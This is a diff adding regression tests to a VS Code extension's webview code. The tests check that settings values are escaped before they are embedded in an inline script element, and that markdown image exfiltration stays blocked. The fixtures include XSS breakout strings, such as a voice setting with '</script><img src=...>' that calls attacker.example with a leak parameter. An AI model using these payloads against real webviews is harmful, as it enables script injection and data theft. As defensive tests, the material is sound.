@@ -1,9 +1,12 @@
 import { describe, test, expect } from 'vitest';
+import * as vscode from 'vscode';
 import {
     aggregateBannerStatus,
     isAllowedImageSrc,
     isAllowedLinkUrl,
     renderMarkdownToHtml,
+    renderShell,
+    safeJsonForScriptElement,
 } from './webview';
 
 describe('aggregateBannerStatus', () => {
@@ -220,5 +223,68 @@ describe('renderMarkdownToHtml — image exfiltration (#91)', () => {
         const html = renderMarkdownToHtml('![](https://attacker.example/x)');
         expect(html).not.toMatch(/<img\b/i);
         expect(html).not.toMatch(/\[image:/);
+    });
+});
+
+describe('safeJsonForScriptElement — regression for #96', () => {
+    test('round-trips ordinary JSON values unchanged in meaning', () => {
+        const value = { enabled: true, autoPlay: false, voice: 'Alex', rate: 1.25, pitch: 1 };
+        const encoded = safeJsonForScriptElement(value);
+        expect(JSON.parse(encoded)).toEqual(value);
+    });
+
+    test('escapes the script-closing sequence </script> inside string values', () => {
+        const value = { voice: 'pwn</script><img src=x>' };
+        const encoded = safeJsonForScriptElement(value);
+        expect(encoded).not.toMatch(/<\/script/i);
+        // The escaped form still decodes to the original string when parsed.
+        expect(JSON.parse(encoded)).toEqual(value);
+    });
+
+    test('escapes < and > defensively even outside the </script> sequence', () => {
+        const encoded = safeJsonForScriptElement({ voice: 'a<b>c' });
+        expect(encoded).not.toContain('<');
+        expect(encoded).not.toContain('>');
+    });
+
+    test('escapes U+2028 and U+2029 (JS line-terminator hazards)', () => {
+        // U+2028/U+2029 terminate JavaScript string literals when JSON is
+        // pasted into a `<script>` element. They are legal in JSON strings
+        // but break out when the embedded JSON is evaluated as JS.
+        const value = { voice: 'before after end' };
+        const encoded = safeJsonForScriptElement(value);
+        expect(encoded).not.toMatch(/[\u2028\u2029]/);
+        expect(JSON.parse(encoded)).toEqual(value);
+    });
+});
+
+describe('renderShell — script-element breakout via settings (#96)', () => {
+    const stubWebview = { cspSource: 'vscode-webview://x' } as unknown as vscode.Webview;
+    const adversarialSpeechConfig = {
+        enabled: true,
+        autoPlay: false,
+        voice: '</script><img src="https://attacker.example/p?leak=1">',
+        rate: 1,
+        pitch: 1,
+    };
+
+    test('voice setting containing </script> does NOT close the boot <script> element', () => {
+        const html = renderShell(stubWebview, 'fixture.ts', 'Full file', adversarialSpeechConfig);
+        // The literal `</script>` from the voice must not appear in the output,
+        // because that would close the inline <script> that boots speechConfig
+        // and let the trailing HTML render as body content.
+        expect(html).not.toMatch(/<\/script>\s*<img/i);
+        // The escaped form should appear instead — the string survives, the
+        // breakout doesn't. JSON.stringify does not escape forward slashes by
+        // default, so the literal escaped form in the output is `</script>`.
+        expect(html).toMatch(/\\u003c\/script\\u003e/);
+    });
+
+    test('the rendered shell is still well-formed with adversarial input', () => {
+        const html = renderShell(stubWebview, 'fixture.ts', 'Full file', adversarialSpeechConfig);
+        // Count <script and </script — must be balanced (every open has a close).
+        const opens = (html.match(/<script\b/gi) || []).length;
+        const closes = (html.match(/<\/script>/gi) || []).length;
+        expect(opens).toBe(closes);
     });
 });
